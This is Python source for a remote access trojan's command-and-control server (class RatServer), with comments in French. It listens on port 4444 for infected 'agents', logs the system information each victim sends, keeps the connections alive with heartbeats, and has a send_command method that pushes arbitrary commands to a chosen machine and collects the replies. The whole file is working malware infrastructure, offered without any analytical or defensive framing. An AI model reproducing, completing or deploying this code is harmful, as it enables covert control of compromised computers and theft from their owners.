import socket
import threading
import time
import logging
import os
import base64
import sys

# ajoute le dossier parent au path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from shared.config import Config
from shared.protocol import Protocol, Message

class RatServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.config = Config()
        self.protocol = Protocol(self.config.get_cipher())
        self.clients = {}  # id: {"socket": sock, "info": {...}, "last_seen": time}
        self.client_counter = 0
        self.running = False
        
        # setup logger
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
        
    def start(self):
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            print(f"[*] Listening on {self.host}:{self.port}...")
            
            # thread pour nettoyer les clients inactifs
            cleanup_thread = threading.Thread(target=self._cleanup_clients, daemon=True)
            cleanup_thread.start()
            
            while self.running:
                try:
                    client_sock, addr = self.sock.accept()
                    self.client_counter += 1
                    client_id = self.client_counter
                    
                    print(f"[+] Agent received from {addr[0]}:{addr[1]} (ID: {client_id})")
                    
                    # thread pour chaque client
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_sock, client_id, addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.error:
                    if self.running:
                        print("[-] Erreur socket")
                        
        except Exception as e:
            print(f"[-] Erreur serveur: {e}")
        finally:
            self.stop()
            
    def _handle_client(self, client_sock, client_id, addr):
        # gere un client specifique
        try:
            # ajoute le client a la liste
            self.clients[client_id] = {
                "socket": client_sock,
                "addr": addr,
                "info": {},
                "last_seen": time.time()
            }
            
            # recoit les infos initiales
            initial_msg = self.protocol.receive_full_message(client_sock)
            if initial_msg and initial_msg.type == "client_info":
                self.clients[client_id]["info"] = initial_msg.data
                print(f"[*] Client {client_id} info: {initial_msg.data}")
                
            # garde la connexion vivante
            while self.running and client_id in self.clients:
                try:
                    client_sock.settimeout(35)  # timeout plus long que heartbeat client
                    msg = self.protocol.receive_full_message(client_sock)
                    
                    if not msg:
                        print(f"[DEBUG] No message from client {client_id}, disconnecting")
                        break
                        
                    self.clients[client_id]["last_seen"] = time.time()
                    
                    if msg.type == "heartbeat":
                        # repond au heartbeat SANS attendre de reponse
                        response = Message("heartbeat_ack")
                        self._send_message_safe(client_sock, response)
                        print(f"[DEBUG] Heartbeat from client {client_id}")
                        
                except socket.timeout:
                    # timeout - verifie si le client est encore la
                    current_time = time.time()
                    if current_time - self.clients[client_id]["last_seen"] > 90:
                        print(f"[DEBUG] Client {client_id} timeout (no heartbeat)")
                        break
                    continue
                except Exception as e:
                    print(f"[DEBUG] Client {client_id} error: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"Erreur client {client_id}: {e}")
        finally:
            # nettoie le client
            self._cleanup_single_client(client_id)
            
    def _send_message_safe(self, sock, message):
        # envoie un message de maniere securisee
        try:
            data = self.protocol.pack_message(message)
            sock.sendall(data)
            return True
        except:
            return False
            
    def _cleanup_clients(self):
        # nettoie les clients inactifs toutes les 60 sec
        while self.running:
            current_time = time.time()
            dead_clients = []
            
            for client_id, client_info in list(self.clients.items()):
                if current_time - client_info["last_seen"] > 120:  # 2 min timeout
                    dead_clients.append(client_id)
                    
            for client_id in dead_clients:
                print(f"[-] Client {client_id} timeout")
                self._cleanup_single_client(client_id)
                    
            time.sleep(60)
            
    def _cleanup_single_client(self, client_id):
        # nettoie un client specifique de maniere securisee
        if client_id in self.clients:
            try:
                self.clients[client_id]["socket"].close()
            except:
                pass
            try:
                del self.clients[client_id]
                print(f"[-] Client {client_id} disconnected")
            except KeyError:
                # client deja supprime
                pass
            
    def send_command(self, client_id, command, args=None):
        # envoie une commande a un client specifique - VERSION SECURISEE
        if client_id not in self.clients:
            return {"status": "error", "message": "Client not found"}
            
        client_sock = self.clients[client_id]["socket"]
        
        # test si le socket est encore valide
        try:
            client_sock.getpeername()
        except:
            # socket ferme
            self._cleanup_single_client(client_id)
            return {"status": "error", "message": "Client disconnected"}
            
        try:
            message = Message(command, args or {})
            
            # envoie la commande
            if not self._send_message_safe(client_sock, message):
                self._cleanup_single_client(client_id)
                return {"status": "error", "message": "Failed to send command"}
            
            # attend la reponse avec timeout
            try:
                old_timeout = client_sock.gettimeout()
                client_sock.settimeout(30)  # 30 sec timeout
                
                response = self.protocol.receive_full_message(client_sock)
                
                # restore timeout seulement si socket encore valide
                try:
                    client_sock.settimeout(old_timeout)
                except:
                    pass  # socket peut etre ferme entre temps
                
                if response:
                    self.clients[client_id]["last_seen"] = time.time()
                    return response.to_dict()
                else:
                    self._cleanup_single_client(client_id)
                    return {"status": "error", "message": "No response from client"}
                    
            except socket.timeout:
                return {"status": "error", "message": "Command timeout"}
            except:
                self._cleanup_single_client(client_id)
                return {"status": "error", "message": "Connection lost"}
                
        except Exception as e:
            self._cleanup_single_client(client_id)
            return {"status": "error", "message": f"Command failed: {e}"}
        
    def list_clients(self):
        # liste tous les clients connectes
        return {
            client_id: {
                "addr": info["addr"],
                "info": info["info"],
                "last_seen": info["last_seen"]
            }
            for client_id, info in self.clients.items()
        }
        
    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except:
            pass